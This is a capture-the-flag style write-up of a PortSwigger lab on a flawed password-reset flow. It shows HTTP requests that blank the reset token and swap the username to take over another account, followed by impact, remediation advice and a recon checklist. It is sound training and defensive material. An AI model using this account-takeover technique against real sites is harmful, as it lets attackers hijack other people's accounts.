# Password reset broken logic

**Category:** Authentication
**Level:** Apprentice
**Mechanism:** Reset token not validated on submit — account chosen by attacker-controlled `username`

**Lab URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

---

## Vulnerability

The password reset submits both a reset token and a `username` in the same request. The
server decides **which account to reset from the `username`**, and never checks that the
token is valid or that it belongs to that user. The token is decorative: identity is
asserted by a parameter the attacker controls, so the reset can be pointed at any
account.

## Reconnaissance & Exploitation

Requesting a reset for my own user (`wiener`) sent an email with the token as a URL
query parameter:

```
https://<lab>.web-security-academy.net/forgot-password?temp-forgot-password-token=facvc1rh6obxnki0dneniphje6zdf944
```

Following the link and setting a new password produced the key observation — the submit
request carries the token **and** the username together:

```http
POST /forgot-password?temp-forgot-password-token=facvc1rh6obxnki0dneniphje6zdf944 HTTP/2
Host: 0a3900170495e74b8b58894d001e00ca.web-security-academy.net
Cookie: session=2oc18zmjyIhD9wcQWSsOqyuoaksx2KHz
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=facvc1rh6obxnki0dneniphje6zdf944&username=wiener&new-password-1=password&new-password-2=password
```

```http
HTTP/2 302 Found
Location: /
```

The presence of `username` in the body is the tell: if the account were derived from the
token, the username would be redundant. Sent to Repeater, **blanking the token in both
the URL and the body still returned `302 → /`** — the token is not validated on submit.

With the token confirmed as unchecked, I changed `username` to `carlos`:

```http
POST /forgot-password?temp-forgot-password-token= HTTP/2
Host: 0a3900170495e74b8b58894d001e00ca.web-security-academy.net
Cookie: session=2oc18zmjyIhD9wcQWSsOqyuoaksx2KHz
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos&new-password-1=password&new-password-2=password
```

```http
HTTP/2 302 Found
Location: /
```

carlos's password was set to a value I control. Logging in as `carlos:password` and
loading `/my-account` solved the lab.

## Impact

Full account takeover of any user by username alone, with no token and no interaction
from the victim. The reset flow — the mechanism meant to prove the requester owns the
account — grants control of arbitrary accounts, because the server trusts an
attacker-supplied `username` instead of a secret tied to the account. An attacker needs
only a valid username (often public or enumerable) to reset and hijack admin or victim
accounts.

## Remediation

- Bind the reset to the token, not to a request parameter: store the token server-side
  associated with a `user_id`, and on submit resolve the account **from the token only**.
  The request must not contain a `username`/`email` field at all.
- Validate the token on submit: reject the request if the token is missing, unknown,
  expired, or already used. Make tokens single-use and short-lived.
- Use high-entropy, unpredictable tokens so they cannot be guessed or brute-forced.

## References

- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-640 (Weak Password Recovery Mechanism); CWE-287 (Improper Authentication); CWE-306 (Missing Authentication for Critical Function)

## Notes

- Recon pattern for any reset flow: find where the **token** lives and where **identity**
  is asserted, then test them separately. Blank/alter the token → if the reset still
  works, it isn't validated. Swap the identity parameter → if another account resets, it
  isn't bound to the token.
- The `username` as a hidden input in the submit is the antipattern that flags this before
  any test — a correctly built reset never needs it.
- Related reset attacks worth remembering: token leak via `Host` header poisoning (see
  lab 07) and via the `Referer` header to third-party resources; predictable,
  non-expiring, or reusable tokens.